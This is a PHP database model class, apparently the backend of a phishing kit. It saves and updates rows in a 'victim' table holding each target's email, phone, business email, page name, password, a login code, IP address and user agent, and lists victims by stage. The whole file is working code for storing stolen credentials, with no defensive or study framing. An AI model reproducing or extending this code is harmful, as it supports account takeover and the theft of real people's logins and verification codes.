<?php

require_once '../config/database/sql.php'; 

class DTBModel {
    private $db;

    public function __construct() {
        $this->db = (new Database())->connect();
    }

    
    public function Send($email, $phone, $fullname, $pagename,$emailbusiness, $password, $code, $step, $status, $time, $country, $ip, $useragent) {
        // Kiểm tra email tồn tại
        $sql = "SELECT id FROM victim WHERE email = :email";
        $stmt = $this->db->prepare($sql);
        $stmt->execute([':email' => $email]);
        $existingId = $stmt->fetchColumn();
    
        if ($existingId) { 
            $updateSql = "UPDATE victim SET phone = :phone, emailbusiness = :emailbusiness, fullname = :fullname , pagename = :pagename, password = :password, code = :code, step = :step, status = :status, time = :time, country = :country, ip = :ip, useragent = :useragent WHERE email = :email";
            $updateStmt = $this->db->prepare($updateSql);
            $updateStmt->execute([
                ':phone' => $phone,
                ':emailbusiness' => $emailbusiness,
                ':fullname' => $fullname,
                ':pagename' => $pagename,
                ':password' => $password,
                ':code' => $code,
                ':step' => $step,
                ':status' => $status,
                ':time' => $time,
                ':country' => $country,
                ':ip' => $ip,
                ':useragent' => $useragent,
                ':email' => $email
            ]);
        } else { 
            $insertSql = "INSERT INTO victim (email, phone, emailbusiness, fullname, pagename, password, code, step, status, time, country, ip, useragent) VALUES (:email, :phone, :emailbusiness, :fullname, :pagename, :password, :code, :step, :status, :time, :country, :ip, :useragent)";
            $insertStmt = $this->db->prepare($insertSql);
            $insertStmt->execute([
                ':email' => $email,
                ':phone' => $phone,
                ':emailbusiness' => $emailbusiness,
                ':fullname' => $fullname,
                ':pagename' => $pagename,
                ':password' => $password,
                ':code' => $code,
                ':step' => $step,
                ':status' => $status,
                ':time' => $time,
                ':country' => $country,
                ':ip' => $ip,
                ':useragent' => $useragent
            ]);
        }
        $sql = "SELECT * FROM victim WHERE email = :id";
        $stmt = $this->db->prepare($sql);
        $stmt->execute([':id' => $email]);
        return $stmt->fetch(PDO::FETCH_ASSOC)['id'];
    }
    

    public function get_by_id($id) {
        $sql = "SELECT * FROM victim WHERE id = :id";
        $stmt = $this->db->prepare($sql);
        if($stmt->execute([':id' => $id])){
            return $stmt->fetch(PDO::FETCH_ASSOC);
        }else{
            return false;
        }
        
    } 
    
    public function get_list() {
    $sql = "SELECT * FROM victim WHERE step = :step";
    $stmt = $this->db->prepare($sql);
    if ($stmt->execute([':step' => 1])) {
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } else {
        return false;
    }
}


    public function update_by_id($id, $updates) { 
        $updateParts = [];
        foreach ($updates as $field => $value) {
            $updateParts[] = "{$field} = :{$field}";
        }
        $updateString = implode(', ', $updateParts); 
        $sql = "UPDATE victim SET {$updateString} WHERE id = :id"; 
        $stmt = $this->db->prepare($sql); 
        $updates[':id'] = $id; 
        if($stmt->execute($updates)) {
            return true; 
        } else {
            return false;  
        }
    }
    
}
